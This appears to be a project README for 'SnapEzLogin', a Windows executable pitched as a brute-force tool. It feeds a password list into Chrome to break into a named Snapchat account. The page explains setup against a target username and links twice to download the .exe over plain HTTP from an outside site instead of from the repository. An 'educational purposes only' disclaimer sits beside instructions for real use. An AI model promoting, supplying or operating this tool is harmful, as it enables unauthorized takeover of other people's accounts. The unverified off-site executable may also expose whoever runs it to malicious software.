![SnapEzLogin Interface](https://raw.githubusercontent.com/we-lord/snapezlogin/refs/heads/main/snap.PNG)
[![Download SnapEzLogin.exe](https://img.shields.io/badge/Download-SnapEzLogin.exe-blue)](http://byweb.fr/SnapEzLogin.exe)

# SnapEzLogin

SnapEzLogin is a simple and efficient brute‑force tool designed to automate password attempts on Snapchat by leveraging Google Chrome.

> **Warning:** This project is for educational purposes only. Unauthorized access to accounts is illegal and unethical.

## Prerequisites

* **Google Chrome** must be installed on your machine.
* A text file named `pass.txt` containing one password per line.

## Configuration

Before running SnapEzLogin, provide the following:

1. **Host Name**

   * Your computer’s name used to locate the Chrome executable (e.g., `MY-PC` for the path `C:\Users\MY-PC\AppData\Local\Google\Chrome\Application\chrome.exe`).

2. **Snapchat Username**

   * The target account’s username.

3. **Password List**

   * Place your list of passwords in `pass.txt` in the same folder as the executable.

## Usage

**Download & Run**
[![Download SnapEzLogin.exe](https://img.shields.io/badge/Download-SnapEzLogin.exe-blue)](http://byweb.fr/SnapEzLogin.exe)

1. Save `SnapEzLogin.exe` and your `pass.txt` in the same directory.
2. Double‑click **SnapEzLogin.exe** to start the brute‑force process.

If a password from the list succeeds, the tool will display it and stop further attempts.

## Project Structure

```
SnapEzLogin/
├── SnapEzLogin.exe    # Compiled executable
└── pass.txt           # Your password list
```

